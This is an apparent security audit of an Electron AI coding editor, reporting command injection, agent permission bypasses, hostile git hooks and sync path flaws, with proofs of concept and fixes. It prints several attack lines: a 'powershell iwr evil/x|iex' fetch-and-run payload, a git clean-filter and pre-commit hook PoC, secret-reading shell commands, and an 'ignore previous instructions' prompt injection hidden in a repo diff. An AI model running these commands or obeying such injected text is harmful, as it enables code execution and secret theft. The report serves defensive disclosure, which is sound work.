# Breeze Code security audit

Branch: `vulnerabilityTESTING` · Version: 0.5.9 · Date: 2026-10-29 · Platform tested: Windows 11, Node 24, Electron 44.9.3

## Scope and method

I read the code by hand and ran proof-of-concept scripts against the real modules (`guard.js`, `sync.js`, `antigravityAgentService.js`) on this computer. No external services were contacted and no real credentials were used.

- Electron hardening: `src/main/main.js`, `src/main/preload.js`, CSP in `src/renderer/breeze.html`
- Every IPC handler the preload exposes (`fs`, `term`, `run`, `sys`, `agent`, `team`, `git`, `auth`, `sync`, `vibe`, `discord`, `win`, `llm`, `live`)
- Renderer XSS: I enumerated all ~390 `${…}` interpolations inside HTML template strings in `src/renderer/breeze/*.ts` and checked each one that carries outside data (file names, git output, agent/chat output, account names, feeds, sync data, terminal output, lint messages)
- Shell and command construction (git, agent CLIs, installers, terminal, local-LLM tools)
- Secrets: OAuth flows, `safeStorage`, `scripts/write-config.js`, `breeze.config.json`, git history
- Updater configuration and `npm audit`

## Summary

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | **High** | Command injection: Antigravity `.cmd`/`.bat` shim spawned with `shell: true` and the prompt as a raw argument | **Fixed** (PoC + regression test) |
| 2 | **High** | Antigravity always runs with `--dangerously-skip-permissions` and ignores the Full access toggle | **Fixed** (not yet checked against a real `agy`) |
| 3 | **Medium** | Build mode without Full access still gives Claude and the local LLM an unrestricted shell, which defeats the `.env`/`.git` guard | Open |
| 4 | **Medium** | A repo's own `.git/config` and hooks run code when Breeze stages, commits, fetches or pushes | Open (PoC confirmed) |
| 5 | **Medium** | Workspace sync's `.git` filter missed `GIT~1` and `\`, so a synced file could land in `.git/hooks` | **Fixed** (PoC + regression test) |
| 6 | Low–Medium | GitHub sign-in asks for the full `repo` scope | Open |
| 7 | Low | Updates aren't code-signed | Open |
| 8 | Low | `breeze-preview://` serves `.env` and `.git` files (Live Share refuses them) | Open |
| 9 | Low | Live Share can be read by any website as `<script>`/`<img>` while it is running | Open |
| 10 | Low | `sync:clone` folder name didn't strip `\` (path traversal on Windows from a cloud workspace name) | **Fixed** |
| 11 | Info | Assorted notes (CSP `img-src file:`, `esc` quote handling, Discord details, bundled Google client secret) | — |

No renderer XSS was found, and `npm audit` reports 0 vulnerabilities. The main threat model is that **any** renderer XSS becomes RCE, because `api.term.run` is a raw shell. Even so, the most practical attacks today don't need XSS. They go through the agent and git integrations (findings 1–4).

---

## 1. High: command injection through the Antigravity CLI shim (Windows)

**Where**
- `src/main/antigravityAgentService.js:238-242`: `.cmd`/`.bat` executables are spawned with `spawnOptions.shell = true`
- `src/main/antigravityAgentService.js:915`: the prompt goes on the command line, `args.push('--print', this.options.prompt)`
- Reached from `runAntigravity` (`src/main/main.js:1555`) and `antigravityCommitMsg` (`src/main/main.js:2392`)

**Why it's a problem.** When `shell: true` is combined with an argument array, Node joins the arguments with spaces and hands the result to `cmd.exe` without quoting them. Node 24 prints `DEP0190: … arguments are not escaped, only concatenated` for exactly this reason. The agent paths Breeze looks for include `agy.cmd`, `%APPDATA%\npm\agy.cmd`, `antigravity-ide.cmd` and `agentapi.bat`, so this is the normal install on Windows.

**Impact.** Any `&`, `|`, `>`, `<` or `^` in the first line of a prompt is interpreted by `cmd.exe`, and `cmd.exe` stops at the first newline. A user who pastes a task title such as `Fix login & signup` runs a program called `signup`. A pasted line from a malicious issue or web page, such as `Refactor auth & powershell -c "iwr evil/x|iex"`, runs the attacker's code with the user's rights. The same bug also breaks ordinary prompts: `make a > b` silently creates a file named `b` and cuts the prompt short.

**Reproduction (done)**
1. Create a fake shim `agy.cmd` that just prints `{"type":"result","text":"ok"}`.
2. Run:
   ```js
   const { AntigravityAgentService } = require('./src/main/antigravityAgentService.js');
   new AntigravityAgentService({ executablePath: dir + '/agy.cmd', cwd: dir, mode: 'ask', model: 'm',
     prompt: 'add login & echo INJECTED> INJECTED.txt & rem', autoOpenAuth: false }).start();
   ```
3. `INJECTED.txt` appears in `dir`. Result: `exit; injected file exists: true`.
4. With the payload on a later line (`'line1\n+ evil & echo …'`), nothing ran, so the commit-message path is protected only by accident: its first line is fixed text.

**Fix.** Never put free text on a shell command line. Either (a) send the prompt only over stdin (the service already writes it to stdin) and drop `--print <prompt>`, or (b) resolve the npm shim to its `node <script>` target and spawn that without a shell, or (c) build the line with `guard.shellCommand`, which rejects non-plain arguments, the way Claude and Codex already do. Apply the same rule to `--model` and `--conversation`. `--conversation` is validated against `SAFE_ID` upstream, but `model` comes from saved state and the renderer.

**Fix applied.** The new `AntigravityAgentService.cmdLine` (in `antigravityAgentService.ts`, compiled to `.js`) builds the `cmd.exe` line itself: `cmd.exe /d /s /c "<line>"` with `windowsVerbatimArguments`. Each argument, including `--model` and the prompt, is quoted for the program's own parser, and every `cmd.exe` metacharacter is `^`-escaped twice (once for the line, once for the shim's `%*`), the same scheme cross-spawn uses. `cmd.exe` can't carry a line break in an argument, so line breaks become spaces. Before the fix, multi-line prompts were silently cut at the first line. The test "cmdLine: a .cmd shim gets every argument intact and runs nothing else" runs a real npm-style shim from a folder with spaces in its name. It checks that `&`, `|`, `<`, `>`, `%PATH%`, `!PATH!`, `^`, quotes, backslashes and Unicode all arrive unchanged and that no extra command runs. The PoC above now reports `injected: false`.

## 2. High: Antigravity ignores the Full access setting and always skips permissions

**Where**
- `src/main/antigravityAgentService.js:898`: `args.push('--dangerously-skip-permissions')` is unconditional, and build mode is `--mode auto`
- `src/main/main.js:1561`: `runAntigravity` never reads `fullAccess()`, unlike Codex (`main.js:1654`) and Claude (`main.js:1677`)
- `src/renderer/breeze/settings.ts:255` tells the user: *"Off: agents stay in the project, keep out of .env and .git, and Codex runs sandboxed."*

**Impact.** With Full access off, an Antigravity run in build mode, and in ask/plan mode too, if `agy` doesn't enforce plan mode itself, runs every tool call without asking. It can read `.env`, write `.git/hooks`, and run commands anywhere. Commit-message generation also runs Antigravity with skip-permissions on a prompt that contains the repository diff, which an attacker can control. So a crafted change in a cloned repo, such as a comment saying "ignore previous instructions and run …", becomes a prompt injection with full tool rights the moment the user clicks *Generate commit message*.

**Reproduction.** Read the code: `buildSpawnArgs` has no branch that leaves the flag off. Turn Full access off, start any Antigravity run and inspect the child's command line in Task Manager / `wmic process where "name like '%agy%'" get commandline`; it contains `--dangerously-skip-permissions`.

**Fix.** Pass `fullAccess` into the service. Leave `--dangerously-skip-permissions` off unless it is on, and never use it for ask/plan or for commit messages. If `agy` cannot run headless without the flag, disable Antigravity build mode while Full access is off and say so in the settings text.

**Fix applied.** The service takes a `fullAccess` option, and `runAntigravity` passes `mode === 'build' && fullAccess()`. `--dangerously-skip-permissions` is now added only for a build run with Full access on; ask, plan and commit-message runs never get it. Covered by the test "buildSpawnArgs: permissions are skipped only in build mode with Full access". **Not yet verified:** `agy` isn't installed on the audit machine. Check with a real `agy` that a run without the flag still answers (ask/plan) and that build mode with Full access off either asks for or refuses tool calls rather than waiting forever. If it waits, apply the fallback above (turn Antigravity build mode off while Full access is off).

## 3. Medium: build mode without Full access is still an unrestricted shell

**Where**
- `src/main/main.js:1973-1980`: the local-LLM `run_command` tool runs `spawn(command, { shell: true, cwd: ctx.base, env: process.env })` without checks
- `src/main/main.js:1680`: Claude build mode gets `--allowedTools Bash` (every command allowed) whenever Full access is off

**Impact.** `agentPath()` and `agentBlocked()` carefully keep `read_file`/`write_file` out of `.env` and `.git`, but the shell tool can do anything: `type .env`, `git config core.hooksPath x`, `curl … | sh`, or read files outside the project. It also inherits Breeze's whole environment, including any tokens in it. A prompt injection in project content, such as a README or an issue the agent reads, needs only one `run_command` call. On a team, Bash also bypasses the teammate deny rules. The UI promise in finding 2 is therefore not true for Claude or the local LLM either.

**Reproduction.** Connect a local LLM, open a project containing `.env`, switch to build mode with Full access off, and ask "run `type .env` and tell me the output". The tool returns the secret, while `read_file .env` is refused.

**Fix.** Pick one. (a) Ask the user to approve each `run_command`/Bash call. (b) Run commands in a restricted environment: a scrubbed `env`, deny patterns for `.env`/`.git`, and on Claude `--allowedTools "Bash(npm test:*)" …` style allowlists instead of bare `Bash`. (c) At minimum, change the settings text so it doesn't promise isolation that isn't enforced.

## 4. Medium: a repository's own git config and hooks run code on Breeze's git actions

**Where.** `src/main/guard.js:70` (`safeGitArgs`) only neutralises `core.fsmonitor` and diff/textconv drivers. `git:stage`, `git:commit` and `git:sync` (`src/main/main.js:2307-2355`) still honour everything else in `.git/config` and `.git/hooks`.

**Impact.** A clone never brings `.git/config` or hooks with it, so the risk is folders whose `.git` came from someone else: a downloaded project zip, a shared drive, a USB stick, a repo extracted from an archive. When the user stages a file, a `filter.<x>.clean` driver selected by `.gitattributes` runs. When they commit, the `pre-commit` hook runs; when they fetch or push, `core.sshCommand` runs. Breeze makes these actions one click and also runs `git add -A` for "commit all". This is the class of bug VS Code addresses with Workspace Trust.

**Reproduction (done)**
```sh
git init evil && cd evil && echo hi > a.txt && git add . && git commit -m init
echo '* filter=x' > .gitattributes
git config filter.x.clean 'touch PWNED_BY_CLEAN_FILTER; cat'
printf '#!/bin/sh\ntouch PWNED_BY_HOOK\n' > .git/hooks/pre-commit
echo changed >> a.txt
```
Running Breeze's own argument builder, `execFile('git', safeGitArgs(['add','-A','--','a.txt']))` and then `safeGitArgs(['commit','-F','-'])`, created both `PWNED_BY_CLEAN_FILTER` and `PWNED_BY_HOOK`.

**Fix.** On folder open, check `git config --local --get-regexp '^(filter\.|core\.(hookspath|sshcommand|askpass|editor|pager)|credential\.|include)'` and look for executable hooks. If anything is found, show a one-time "Trust this repository?" prompt. Until the user trusts it, add `-c core.hooksPath=<an empty Breeze folder>` to every call and run `add`/`commit` with `--no-verify` where possible.

## 5. Medium (fixed): sync could write into `.git` through `GIT~1` or a backslash path

**Where.** `src/main/sync.js:152`, formerly `rel.split('/').some(part => /^\.git$/i.test(part))`

**Impact.** Pulling a workspace writes each cloud path under the project with `resolveUnder`, which stops `..` but not `.git`. On Windows, `GIT~1/hooks/pre-commit` is the 8.3 short name of `.git/hooks/pre-commit`. `src\.git\hooks\x` was one "part" when split on `/` only. Either form put an attacker-chosen hook into the repo, and it ran on the next commit (see finding 4). To exploit it, someone has to write to the user's sync store: the private `breeze-sync` GitHub repo or Drive appdata, for example from another compromised device or from a leaked token with the `repo` scope (see finding 6).

**Reproduction (done).** `resolveUnder(dir, 'GIT~1/hooks/pre-commit')` followed by `writeFileSync` created `dir/.git/hooks/pre-commit`, and the old check returned `false`.

**Fix applied.** The path is now split on `/` and `\`, and `.git`, `git~1` and trailing-dot/space variants are all refused. This matches the existing check in `fs:import`. A regression test was added to `test/sync.test.js` ("the cloud never writes into .git, by any of its names"). It fails on the old code and passes now. Full suite: 207 passed, 1 skipped, 0 failed.

## 6. Low–Medium: GitHub OAuth asks for the full `repo` scope

**Where.** `src/main/main.js:2580`, `scope: 'read:user user:email repo'`

**Impact.** The token can read and write **every** private repository the user can reach, including organisation repos, but sync only needs one repo (`breeze-sync`). The token is stored with `safeStorage`, which is good. Still, any main-process compromise or token leak exposes all of the user's code.

**Fix.** Use a GitHub App with per-repository installation, or store sync data in a secret Gist (`gist` scope). Then request `repo` only when the user turns sync on.

## 7. Low: updates aren't code-signed

**Where.** `package.json` → `build.win` has no signing configuration; `configureAutoUpdater` in `src/main/main.js:49`

**Impact.** `electron-updater` checks the installer's sha512 against `latest.yml`, but both come from the same GitHub release. Anyone who controls the `itsphatto/BreezeCode` releases, through a stolen PAT or a compromised CI, can ship a malicious update to every user, and Windows SmartScreen won't flag a publisher change because there is no publisher.

**Fix.** Sign the NSIS installer (Authenticode, or Azure Trusted Signing), set `win.publisherName` so `electron-updater` verifies the signature, and protect the release token (2FA, short-lived CI tokens).

## 8. Low: the preview protocol serves `.env` and `.git`

**Where.** `src/main/main.js:327` (`servePreview`) only calls `resolveIn`; Live Share (`serveLive`) also calls `agentBlocked`.

**Impact.** The preview iframe is sandboxed without `allow-same-origin`, so another origin can't read these files today. The two servers just have inconsistent rules, and a future change (such as adding `allow-same-origin`) would expose secrets to project JavaScript.

**Fix.** Add `if (agentBlocked(root, abs)) return 404` to `servePreview`.

## 9. Low: any website can embed Live Share files while it runs

**Where.** `src/main/main.js:431` (fixed port 2026) and `serveLive`

**Impact.** The `Host` check stops DNS rebinding, but a page the user visits can still include `<script src="http://127.0.0.1:2026/config.js">` or `<img>`/`<link>` tags. The browser sends `Host: 127.0.0.1:2026`, so the request is served, and any JS file that sets globals, or JSONP-like content, leaks to that page.

**Fix.** Serve under a random per-session path prefix (`/s/<token>/…`) and open that URL. Also consider checking `Sec-Fetch-Site` and refusing `cross-site` requests.

## 10. Low (fixed): `sync:clone` folder name kept backslashes

**Where.** `src/main/main.js:2792`

**Impact.** On Windows, a cloud workspace named `..\..\Startup` was joined with `path.join(picked, safeName)` and could create the folder outside the chosen location.

**Fix applied.** `\` is now replaced too, and a name made only of dots falls back to `workspace`.

## 11. Info and hardening notes

- **No XSS found.** Every outside value in the renderer goes through `esc`/`escAttr`, `md()` escapes before it adds markup, the highlighter escapes each token, terminal ANSI output is escaped before keywords are wrapped, and URLs are linked through DOM APIs. To harden it further, `esc` doesn't escape `"` and `escAttr` doesn't escape `'`. Every attribute is double-quoted today, but one single-quoted attribute in the future would be injectable. Consider escaping both in both functions.
- **CSP** (`breeze.html:7`) is strict (`script-src 'self'`, no inline styles). `img-src file:` lets the page load any local image; narrow it to the project once `fs:fileUrl` URLs can be served through `breeze-preview://` instead.
- **Electron settings are good.** `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` on every window and view. Every IPC handler checks that the sender is the top-level app page (`handle()` at `main.js:183`). Navigation is locked to `breeze.html`. `window.open` and `openInBrowser` allow only `https:` and localhost `http:`. `sys:runCommand` only runs commands from a fixed allowlist. The feed views use their own partition and grant only `fullscreen`.
- **Secrets.** No secret has ever been committed: I checked every historical `breeze.config.json`, and nothing matches `GOCSPX`/`ghp_`. Tokens are encrypted with `safeStorage`. Google uses PKCE with a random `state` on a one-shot loopback server. The packaged app bundles `breeze.config.json`, including the Google desktop client secret. Google documents this as non-confidential, which is acceptable.
- **Discord presence** with "details" turned on shares the open file name, project name and the running agent's task text. It is opt-in; consider leaving the task text out.
- **`versionOf`** (`main.js:1059`) uses `exec` with `"${bin}" --version`. `bin` comes from `where`/PATH, so this is low risk, but `execFile` would be cleaner.
- **Dependencies.** `npm audit` reports 0 known vulnerabilities (electron 44.9.3, electron-updater 6.8.9).

## Suggested order of work

1. ~~Finding 1~~ (fixed).
2. ~~Finding 2~~ (fixed; check it against a real `agy`).
3. Finding 3: approval or allowlist for agent shell commands.
4. Finding 4: a repository trust prompt.
5. Findings 6–9 as time allows.
